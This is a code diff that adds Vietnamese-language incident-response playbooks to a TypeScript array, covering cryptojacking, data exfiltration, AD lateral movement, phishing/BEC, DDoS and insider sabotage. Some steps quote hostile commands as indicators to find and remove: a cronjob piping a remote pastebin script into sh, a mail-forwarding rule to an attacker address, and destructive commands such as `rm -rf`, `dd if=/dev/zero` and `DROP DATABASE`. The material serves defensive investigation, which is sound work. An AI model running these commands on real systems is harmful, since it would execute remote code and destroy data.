@@ -256,5 +256,257 @@ export const PLAYBOOKS: Playbook[] = [
       { title: 'Velociraptor — Digital Forensic & Incident Response', url: 'https://docs.velociraptor.app/' },
       { title: 'SANS Threat Hunting Resources', url: 'https://www.sans.org/blog/threat-hunting-resources/' }
     ]
+  },
+  {
+    id: 'cryptojacking',
+    title: 'Cryptojacking & Resource Hijacking',
+    description: 'Quy trình xử lý sự cố máy chủ hoặc máy trạm bị nhiễm mã độc đào tiền ảo. Kịch bản này tập trung vào việc phát hiện nhanh các tiến trình lạm dụng CPU, cắt đứt kết nối mạng đến các mining pools, và gỡ bỏ các đoạn script duy trì.',
+    type: 'Malware Response',
+    platforms: ['Windows', 'Linux', 'Cloud'],
+    mitre: 'T1496 (Resource Hijacking)',
+    color: 'orange',
+    icon: 'Cpu',
+    goals: [
+      'Visibility: Giám sát tài nguyên CPU/GPU và nhận diện tiến trình lạ không rõ nguồn gốc (XMRig, kdevtmpfsi).',
+      'Containment: Chặn lưu lượng truy cập mạng ra các địa chỉ IP và tên miền liên quan đến Mining Pools (TCP 3333, 4444, v.v.).',
+      'Eradication: Vô hiệu hóa tiến trình và xóa bỏ các tác vụ lập lịch (cron, Scheduled Tasks) dùng để tự động tải mã độc xuống.',
+      'Root Cause: Đánh giá lỗ hổng hệ thống ban đầu (VD: Cấu hình Redis/Docker API không an toàn, hoặc mật khẩu SSH yếu).'
+    ],
+    steps: [
+      {
+        title: 'Bước 1: Giám sát Hệ thống & Triage',
+        content: '**Xác định dấu hiệu bất thường:**\n- Kiểm tra các biểu đồ theo dõi hiệu năng (Grafana/Zabbix) xem CPU có duy trì mức 100% trong thời gian dài hay không.\n- Chạy các lệnh kiểm tra trạng thái quy trình (`top`, `htop`, `Get-Process`) trên máy bị nghi ngờ để tìm xem quy trình nào đang tiêu tốn nhiều tài nguyên nhất.\n- Chú ý các tiến trình có tên là các chuỗi ngẫu nhiên hoặc ẩn trong thư mục `/tmp/`, `/dev/shm/`, hoặc thư mục Temp của người dùng.',
+        icon: 'Activity'
+      },
+      {
+        title: 'Bước 2: Phân tích Mạng (Network Analysis)',
+        content: '**Xác định kết nối đào tiền ảo:**\n- Kiểm tra danh sách các kết nối hiện hành (`netstat -antp` hoặc `Get-NetTCPConnection`).\n- Tìm các phiên kết nối dài hạn tới các cổng mạng không tiêu chuẩn nhưng phổ biến của mining pools như 3333, 4444, 5555, 8080.\n- Phân tích DNS queries tìm các tên miền chứa từ khóa "pool", "miner", "xmr", "monero".',
+        icon: 'Network'
+      },
+      {
+        title: 'Bước 3: Vô hiệu hóa Tiến trình & Xóa Persistence',
+        content: '**Làm sạch hệ thống (Eradication):**\n- Ngừng cưỡng bức (Kill) các tiến trình nghi ngờ. Tuy nhiên, mã độc đào tiền ảo thường có cơ chế watchdog (tiến trình tự hồi sinh) nên cần kill cả tiến trình mẹ/con.\n- Kiểm tra toàn diện hệ thống lập lịch: Lệnh `crontab -l`, `cat /etc/crontab` trên Linux; và `schtasks` trên Windows.\n- Loại bỏ các cronjob đáng ngờ (ví dụ: `* * * * * wget -q -O - http://pastebin.com/xxx | sh`).\n- Rà soát các mục Autorun và WMI event subscriptions.',
+        icon: 'Target'
+      },
+      {
+        title: 'Bước 4: Điều tra Nguyên nhân & Khắc phục',
+        content: '**Phòng ngừa tái diễn:**\n- Kiểm tra các dịch vụ đang mở ra Internet (Redis 6379, Docker 2375, SSH 22). Hacker thường quét các dịch vụ không xác thực.\n- Phân tích `auth.log` và `secure` log để xem có dấu hiệu brute-force SSH hay không.\n- Cập nhật phiên bản phần mềm (Patching) và áp dụng cấu hình bảo mật cứng (Hardening) như tắt Password Authentication cho SSH, thay bằng Public Key.',
+        icon: 'ShieldCheck'
+      }
+    ],
+    references: [
+      { title: 'MITRE ATT&CK: Resource Hijacking (T1496)', url: 'https://attack.mitre.org/techniques/T1496/' },
+      { title: 'CISA: Defending Against Cryptojacking', url: 'https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-296a' }
+    ]
+  },
+  {
+    id: 'data-exfiltration',
+    title: 'Data Exfiltration & Insider Threat',
+    description: 'Quy trình điều tra việc truy cập và tuồn dữ liệu nhạy cảm ra ngoài trái phép, do nhân viên nội bộ (Insider) hoặc hacker thực hiện thông qua các công cụ lưu trữ đám mây, email, hoặc ổ cứng gắn ngoài.',
+    type: 'Incident Response',
+    platforms: ['Windows', 'Linux', 'macOS'],
+    mitre: 'T1048 (Exfiltration Over Alternative Protocol)',
+    color: 'pink',
+    icon: 'Database',
+    goals: [
+      'Detection: Xác định các công cụ lưu trữ hoặc giao thức lạ được sử dụng để chuyển đổi lượng lớn dữ liệu.',
+      'Tracing: Truy tìm các thư mục Staging, nơi kẻ gian gom dữ liệu và nén lại (.zip, .7z) trước khi tải lên.',
+      'Evidence: Thu thập dấu vết hoạt động của USB, logs truy cập mạng và các hành vi truy xuất tập tin nhạy cảm.',
+      'Containment: Thu hồi đặc quyền truy cập (Access Revocation) và chặn các cổng truyền dữ liệu ra Internet.'
+    ],
+    steps: [
+      {
+        title: 'Bước 1: Rà soát Thư mục Staging',
+        content: '**Tìm nơi gom dữ liệu (Data Staging):**\n- Hacker hoặc Insider ít khi tải từng tệp một. Họ thường gom tất cả vào một thư mục tạm rồi nén lại.\n- Truy tìm các file nén (`.zip`, `.rar`, `.tar.gz`) có dung lượng lớn bất thường xuất hiện ở các thư mục như `%TEMP%`, `C:\\Users\\Public`, `/tmp/`, `/dev/shm/`.\n- Kiểm tra lịch sử thực thi lệnh (Bash history) hoặc các bản ghi Prefetch/Amcache xem có sử dụng các công cụ `7z.exe`, `WinRAR.exe`, `tar` không.',
+        icon: 'Folder'
+      },
+      {
+        title: 'Bước 2: Kiểm tra Lịch sử Thiết bị Ngoại vi (USB)',
+        content: '**Xác minh khả năng trích xuất vật lý:**\n- Trích xuất dữ liệu từ Windows Registry (`HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR`) để lấy danh sách tất cả các USB từng cắm vào thiết bị.\n- Truy vết thời gian cắm vào/rút ra (Plug/Unplug events) thông qua Event Logs (Event ID 2003, 10000).\n- Liên kết thời gian cắm USB với các sự kiện truy xuất file (File Access).',
+        icon: 'HardDrive'
+      },
+      {
+        title: 'Bước 3: Phân tích Lưu lượng Mạng (Network Data Transfer)',
+        content: '**Phát hiện điểm đến của dữ liệu:**\n- Xem lại logs của Proxy Server, Firewall hoặc NetFlow để tìm các kết nối outbound tiêu thụ lượng băng thông bất thường (đặc biệt theo chiều Upload).\n- Săn lùng các tên miền của các dịch vụ chia sẻ file như Mega, Dropbox, Google Drive, WeTransfer trên các thiết bị không có chính sách cho phép dùng.\n- Phát hiện sự hiện diện của các công cụ dòng lệnh truyền dữ liệu như `curl`, `rclone`, `scp`, `ftp`.',
+        icon: 'Globe'
+      },
+      {
+        title: 'Bước 4: Xác định Phạm vi Thiệt hại (Impact Assessment)',
+        content: '**Đánh giá dữ liệu bị mất:**\n- Nếu hệ thống có bật tính năng File Audit (Event ID 4663) hoặc có hệ thống DLP, trích xuất danh sách các tệp tin nhạy cảm (PII, mã nguồn, kế hoạch tài chính) đã bị truy cập bởi người dùng nghi ngờ.\n- Đưa ra báo cáo thống kê chính xác lượng dữ liệu đã bị tuồn ra ngoài, loại dữ liệu gì và thời gian diễn ra để thông báo cho pháp chế (Legal) hoặc khách hàng.',
+        icon: 'FileWarning'
+      }
+    ],
+    references: [
+      { title: 'MITRE ATT&CK: Exfiltration (TA0010)', url: 'https://attack.mitre.org/tactics/TA0010/' },
+      { title: 'CISA: Insider Threat Mitigation', url: 'https://www.cisa.gov/insider-threat-mitigation' }
+    ]
+  },
+  {
+    id: 'ad-lateral-movement',
+    title: 'Active Directory & Lateral Movement',
+    description: 'Quy trình săn lùng nâng cao trong môi trường Active Directory (AD). Tập trung vào việc phát hiện kẻ tấn công sau khi chiếm một thiết bị, trích xuất thông tin đăng nhập (Credential Dumping) và dùng nó để di chuyển tới các máy chủ quan trọng khác (Lateral Movement).',
+    type: 'Threat Hunting',
+    platforms: ['Windows', 'Active Directory'],
+    mitre: 'T1003 (Credential Dumping) & T1021 (Remote Services)',
+    color: 'indigo',
+    icon: 'Network',
+    goals: [
+      'Visibility: Thu thập toàn diện Event Logs liên quan đến tiến trình đăng nhập mạng và xác thực tài khoản.',
+      'Credential Discovery: Phát hiện dấu vết trích xuất mật khẩu từ bộ nhớ của tiến trình lsass.exe.',
+      'Movement Tracking: Nhận diện việc lạm dụng các dịch vụ điều khiển từ xa (PsExec, WMI, WinRM, RDP) để thực thi mã độc trên máy tính khác.',
+      'Containment: Đóng băng các tài khoản bị xâm phạm và reset mật khẩu khẩn cấp (KRBTGT) nếu có dấu hiệu Golden Ticket.'
+    ],
+    steps: [
+      {
+        title: 'Bước 1: Săn tìm Credential Dumping (LSASS)',
+        content: '**Phát hiện hành vi đánh cắp mật khẩu:**\n- Hacker thường sử dụng Mimikatz, Procdump hoặc các công cụ tương tự để dump bộ nhớ RAM của tiến trình `lsass.exe`.\n- Kiểm tra Windows Event Logs (Sysmon Event ID 10 hoặc Security Event ID 4656/4663) tìm kiếm các tiến trình khác cố gắng yêu cầu quyền `PROCESS_VM_READ` đối với `lsass.exe`.\n- Rà soát các tệp có đuôi `.dmp` (ví dụ: `lsass.dmp`) lưu trong thư mục Temp hoặc AppData.',
+        icon: 'Key'
+      },
+      {
+        title: 'Bước 2: Phân tích Đăng nhập Mạng (Logon Type 3)',
+        content: '**Xác minh kỹ thuật Pass-the-Hash / Overpass-the-Hash:**\n- Tập trung phân tích Security Event ID 4624 (Logon Success). Lọc ra các sự kiện có `Logon Type = 3` (Network Logon).\n- Loại bỏ các logs thông thường (File share bình thường) và chú ý vào các lần đăng nhập mạng từ các máy trạm (Workstations) tới các máy chủ quan trọng (Servers) bằng tài khoản quản trị (Domain Admin).\n- Phát hiện sự bất thường về mật độ đăng nhập từ một nguồn duy nhất IP (dấu hiệu của BloodHound / Sharphound).',
+        icon: 'UserCheck'
+      },
+      {
+        title: 'Bước 3: Phát hiện Thực thi Lệnh Từ xa',
+        content: '**Truy vết PsExec, WMI, WinRM:**\n- Khi di chuyển ngang thành công, hacker phải thực thi lệnh trên máy đích.\n- **PsExec:** Tìm kiếm Event ID 7045 (Service Control Manager) với dịch vụ tên `PSEXESVC` hoặc các service name được sinh ngẫu nhiên chứa file thực thi nằm trong thư mục `C:\\Windows\\`.\n- **WMI:** Truy tìm các tiến trình `WmiPrvSE.exe` sinh ra các tiến trình con đáng ngờ (`cmd.exe`, `powershell.exe`).\n- **WinRM/RDP:** Phân tích logs truy cập RDP ngoài giờ hành chính hoặc Event ID đăng nhập Remote Interactive (Type 10).',
+        icon: 'Terminal'
+      },
+      {
+        title: 'Bước 4: Rà soát Quản trị AD (Privilege Escalation)',
+        content: '**Phát hiện tài khoản được nhúng quyền:**\n- Lọc Event ID 4728, 4732, 4756 (A member was added to a security-enabled global/local/universal group) để xem có user nào đột ngột được cấp quyền Domain Admins hoặc Enterprise Admins.\n- Chạy PowerShell script `Get-ADGroupMember -Identity "Domain Admins"` và đối chiếu định kỳ với danh sách chuẩn.',
+        icon: 'Shield'
+      }
+    ],
+    references: [
+      { title: 'MITRE ATT&CK: Lateral Movement (TA0008)', url: 'https://attack.mitre.org/tactics/TA0008/' },
+      { title: 'Microsoft: Báo cáo kỹ thuật Lateral Movement', url: 'https://www.microsoft.com/en-us/security/business/security-101/what-is-lateral-movement' }
+    ]
+  },
+  {
+    id: 'phishing-bec',
+    title: 'Phishing & Business Email Compromise (BEC)',
+    description: 'Quy trình ứng phó khẩn cấp khi tài khoản email doanh nghiệp (M365, Google Workspace) bị chiếm đoạt thông qua Phishing. Hướng dẫn cách phân tích nguồn gốc email, ngăn chặn phát tán nội bộ và thu hồi quyền truy cập của kẻ tấn công.',
+    type: 'Incident Response',
+    platforms: ['M365', 'Google Workspace', 'Exchange'],
+    mitre: 'T1566 (Phishing) & T1078 (Valid Accounts)',
+    color: 'emerald',
+    icon: 'Briefcase',
+    goals: [
+      'Containment: Cách ly ngay lập tức tài khoản bị xâm phạm, thu hồi mọi phiên đăng nhập (Revoke Sessions) và cưỡng chế MFA.',
+      'Analysis: Phân tích Header Email, Sandboxing tệp đính kèm và kiểm tra các đường dẫn (URLs) lừa đảo.',
+      'Detection: Săn lùng các quy tắc hộp thư (Inbox Rules) lạ dùng để ẩn dấu vết hoặc tự động chuyển tiếp (Forward) email nhạy cảm.',
+      'Eradication: Xóa bỏ các email lừa đảo khỏi hòm thư của những người dùng khác (Purge).' 
+    ],
+    steps: [
+      {
+        title: 'Bước 1: Cách ly & Bảo vệ Tài khoản (Containment)',
+        content: '**Hành động khẩn cấp:**\n- Đăng nhập vào Admin Center (M365/G-Workspace) và **Revoke Sign-in Sessions** của tài khoản bị nghi ngờ xâm phạm.\n- Reset mật khẩu ngay lập tức bằng một mật khẩu mạnh ngẫu nhiên.\n- Bật tính năng **MFA (Multi-Factor Authentication)** nếu tài khoản này chưa được kích hoạt.\n- Gỡ bỏ bất kỳ ứng dụng OAuth 3rd-party nào đáng ngờ được cấp quyền bởi user này.',
+        icon: 'Lock'
+      },
+      {
+        title: 'Bước 2: Săn tìm Email Header & Payload',
+        content: '**Truy vết nguồn gốc Email lừa đảo:**\n- Lấy file email gốc (`.eml` hoặc `.msg`) và phân tích Header qua công cụ MxToolBox hoặc Google Admin Toolbox.\n- Kiểm tra các trường: `Return-Path`, `Reply-To`, `Received` (IP gốc của sender).\n- Xác minh kết quả SPF, DKIM, và DMARC. Thường email giả mạo (Spoofing) sẽ fail các bước kiểm tra này.\n- Bóc xuất các tệp đính kèm (`.docx`, `.pdf`, `.zip`) và tải lên Cuckoo Sandbox hoặc VirusTotal để phân tích động/tĩnh.',
+        icon: 'Search'
+      },
+      {
+        title: 'Bước 3: Rà soát Audit Logs & Inbox Rules',
+        content: '**Xác định hành vi của kẻ tấn công:**\n- Truy cập M365 Unified Audit Log / Google Workspace Reports.\n- Lọc các sự kiện đăng nhập (Logon Events) để xem kẻ tấn công đã đăng nhập từ IP, vị trí địa lý, và User-Agent nào.\n- Kiểm tra các **Inbox Rules / Forwarding Rules**. Kẻ tấn công thường tạo rule: `IF subject contains "invoice" THEN forward to hacker@gmail.com AND move to RSS Feeds folder`.\n- Xóa ngay lập tức các rule độc hại này.',
+        icon: 'FileText'
+      },
+      {
+        title: 'Bước 4: Purge & Thông báo (Remediation)',
+        content: '**Dọn dẹp hòm thư nội bộ:**\n- Dùng PowerShell (M365) hoặc G-Workspace Security Center để tìm kiếm tất cả các mailbox nội bộ đã nhận được email lừa đảo này.\n- Thực hiện lệnh Soft-Delete hoặc Hard-Delete (Purge) các email đó khỏi hòm thư người dùng để tránh có thêm nạn nhân.\n- Phát thông báo nội bộ (Security Awareness) cảnh báo nhân viên về chiến dịch lừa đảo đang diễn ra.',
+        icon: 'Target'
+      }
+    ],
+    references: [
+      { title: 'NIST SP 800-61 Rev. 2: Phân loại sự cố Email', url: 'https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final' },
+      { title: 'CISA: Ứng phó Business Email Compromise', url: 'https://www.cisa.gov/stopransomware/business-email-compromise' }
+    ]
+  },
+  {
+    id: 'ddos-response',
+    title: 'Denial of Service (DDoS) Response',
+    description: 'Quy trình xử lý sự cố ngập lụt băng thông (Volumetric DDoS) hoặc cạn kiệt tài nguyên ứng dụng (Application Layer 7 DDoS) theo tiêu chuẩn NIST.',
+    type: 'Incident Response',
+    platforms: ['Network', 'Web', 'Cloud'],
+    mitre: 'T1498 (Network Denial of Service)',
+    color: 'rose',
+    icon: 'Activity',
+    goals: [
+      'Visibility: Nhanh chóng phân loại tấn công là ở tầng Mạng (Layer 3/4) hay tầng Ứng dụng (Layer 7).',
+      'Containment: Kích hoạt các biện pháp giảm thiểu (Mitigation) như BGP Blackholing, Rate Limiting, WAF "Under Attack Mode".',
+      'Investigation: Phân tích PCAP/Netflow hoặc Access Logs để trích xuất chữ ký (Signature) của cuộc tấn công (User-Agent lạ, IP spoofing).',
+      'Remediation: Scale tài nguyên hệ thống (Auto-scaling) hoặc định tuyến qua CDN bảo vệ.'
+    ],
+    steps: [
+      {
+        title: 'Bước 1: Phân loại cuộc tấn công (Triage)',
+        content: '**Xác định bản chất DDoS:**\n- **Layer 3/4 (Volumetric):** Kiểm tra biểu đồ giám sát mạng (PRTG, Zabbix) thấy băng thông vào (Inbound Traffic) tăng vọt bất thường (SYN Flood, UDP Amplification).\n- **Layer 7 (Application):** Băng thông mạng bình thường nhưng CPU/RAM của Web Server, Database lên 100%. Các HTTP GET/POST request gửi dồn dập vào các trang nặng (Search, Login).\n- **Lưu ý:** DDoS đôi khi chỉ là màn khói (Smokescreen) che đậy cho việc hacker đang chọc thủng Data Breach ở một hệ thống khác. Vẫn phải giám sát logs an ninh tổng thể.',
+        icon: 'Activity'
+      },
+      {
+        title: 'Bước 2: Phân tích Lưu lượng (Analysis)',
+        content: '**Trích xuất Pattern/Signature:**\n- Dùng lệnh `tcpdump -nn -c 1000 -w ddos.pcap` để bắt lưu lượng mẫu.\n- Mở PCAP trên Wireshark để phân tích độ dài gói tin, cờ TCP (Flags), cổng đích.\n- Đối với Layer 7: Sử dụng lệnh `awk \'{print $1}\' access.log | sort | uniq -c | sort -nr | head -20` để tìm ra Top 20 IP đang spam request.\n- Tìm kiếm các điểm chung: User-Agent lạ, đường dẫn bị spam, chuỗi truy vấn đặc biệt.',
+        icon: 'Search'
+      },
+      {
+        title: 'Bước 3: Kích hoạt Giảm thiểu (Mitigation)',
+        content: '**Ngăn chặn lưu lượng rác:**\n- **Layer 3/4:** Liên hệ ngay với ISP hoặc kích hoạt BGP Null Routing/Blackholing đối với các IP mục tiêu bị tấn công để cứu hệ thống mạng chung.\n- **Layer 7:** \n  + Truy cập WAF/CDN (Cloudflare, AWS WAF, Akamai) kích hoạt tính năng **"Under Attack Mode"** (Yêu cầu giải Captcha/JS Challenge).\n  + Áp dụng Rate Limiting (VD: tối đa 50 requests / phút / IP) cho các URI bị nhắm mục tiêu.\n  + Cập nhật WAF rule chặn cụ thể User-Agent độc hại phát hiện được ở Bước 2.',
+        icon: 'Shield'
+      },
+      {
+        title: 'Bước 4: Phục hồi và Củng cố (Recovery)',
+        content: '**Duy trì dịch vụ:**\n- Kích hoạt Auto-scaling để tăng số lượng instance cho Web Server / Database chịu tải tạm thời.\n- Khi lưu lượng giảm dần, theo dõi chặt chẽ thêm 24 giờ trước khi tắt các chế độ phòng vệ nghiêm ngặt.\n- Viết Post-Incident Report và xem xét mua các gói Anti-DDoS chuyên dụng (Scrubbing Center) nếu tần suất bị tấn công cao.',
+        icon: 'Target'
+      }
+    ],
+    references: [
+      { title: 'NIST SP 800-61 Rev. 2: Attrition (DoS)', url: 'https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final' },
+      { title: 'CISA: Hiểu và ứng phó DDoS', url: 'https://www.cisa.gov/news-events/cybersecurity-advisories/understanding-and-responding-distributed-denial-service-attacks' }
+    ]
+  },
+  {
+    id: 'insider-threat',
+    title: 'Insider Threat & Sabotage',
+    description: 'Quy trình đối phó với nhân viên nội bộ (Insider) lạm dụng đặc quyền để phá hoại dữ liệu (xóa Database, cấu hình sai hạ tầng) hoặc cố tình vô hiệu hóa các biện pháp bảo mật.',
+    type: 'Incident Response',
+    platforms: ['Windows', 'Linux', 'Cloud', 'Database'],
+    mitre: 'T1485 (Data Destruction) & T1531 (Account Access Removal)',
+    color: 'blue',
+    icon: 'Briefcase',
+    goals: [
+      'Containment: Khóa khẩn cấp tài khoản nội bộ bị tình nghi và thu hồi quyền truy cập vật lý (thẻ từ, VPN).',
+      'Evidence Preservation: Đảm bảo tính pháp lý (Chain of Custody) của logs Audit để phục vụ xử lý kỷ luật hoặc kiện tụng.',
+      'Analysis: Phân tích Audit Logs của Database, Server, hoặc Cloud Console để xác định chính xác hành vi phá hoại (Lệnh xóa, thay đổi quyền).',
+      'Recovery: Đánh giá thiệt hại và khôi phục dữ liệu từ bản sao lưu gần nhất.'
+    ],
+    steps: [
+      {
+        title: 'Bước 1: Khóa Đặc quyền (Immediate Containment)',
+        content: '**Hành động không báo trước:**\n- Vô hiệu hóa (Disable) tài khoản Active Directory / VPN / M365 của nhân viên ngay lập tức.\n- Chặn thẻ từ truy cập vào Datacenter hoặc phòng máy chủ.\n- Thu hồi mọi session trên Cloud (AWS/Azure/GCP) và Reset các API keys mà nhân viên này từng được cấp quyền tạo.\n- Tạm giữ các thiết bị do công ty cấp phát (Laptop, Điện thoại) để phục vụ điều tra Forensic ngoại tuyến (Offline Forensic).',
+        icon: 'Lock'
+      },
+      {
+        title: 'Bước 2: Phân tích Log Phá hoại (Analysis)',
+        content: '**Xác định bán kính thiệt hại:**\n- **Database:** Trích xuất Audit Logs (MySQL/PostgreSQL/SQL Server) hoặc SQL Profiler tìm kiếm các sự kiện thực thi lệnh `DROP DATABASE`, `DROP TABLE`, `DELETE FROM` không có điều kiện WHERE.\n- **Linux/Server:** Kiểm tra `.bash_history`, `auditd` logs tìm các lệnh `rm -rf`, `dd if=/dev/zero`.\n- **Windows:** Lọc Event ID 4660 (An object was deleted), 4656 (Handle to an object was requested) trên các file server.\n- **Cloud:** Phân tích AWS CloudTrail / Azure Activity Logs tìm kiếm hành vi `DeleteBucket`, `TerminateInstances`.',
+        icon: 'Search'
+      },
+      {
+        title: 'Bước 3: Thu thập Bằng chứng Pháp lý (Forensic Collection)',
+        content: '**Bảo toàn tính pháp lý:**\n- Bất kỳ log hay bằng chứng nào trích xuất ra phải được mã băm (Hash SHA-256) ngay lập tức.\n- Tạo Disk Image (bản sao vật lý) của ổ cứng máy trạm của nhân viên thông qua bộ chặn ghi (Write-Blocker) để tìm kiếm các đoạn script hẹn giờ (Logic Bombs) hoặc bằng chứng trao đổi thông tin với đối thủ cạnh tranh.\n- Đóng băng các cuộn băng từ (Tape) hoặc Backup Storage để ngăn nhân viên đó kịp thời xóa cả bản sao lưu.',
+        icon: 'Download'
+      },
+      {
+        title: 'Bước 4: Đánh giá & Khôi phục (Recovery)',
+        content: '**Khôi phục lại hiện trạng:**\n- Rà soát lại toàn bộ Backup logs để xác minh các bản sao lưu từ T-1 (ngày hôm qua) còn nguyên vẹn.\n- Kiểm tra và xóa bỏ các "Backdoor" nội bộ mà nhân viên này có thể đã tạo trước khi phá hoại (VD: tạo 1 admin account dự phòng khác).\n- Thực hiện khôi phục DB/Server và bàn giao hồ sơ điều tra cho bộ phận Pháp chế (Legal/HR) xử lý.',
+        icon: 'Target'
+      }
+    ],
+    references: [
+      { title: 'NIST SP 800-61 Rev. 2: Inappropriate Usage', url: 'https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final' },
+      { title: 'CISA: Insider Threat Mitigation Guide', url: 'https://www.cisa.gov/insider-threat-mitigation' }
+    ]
   }
 ]
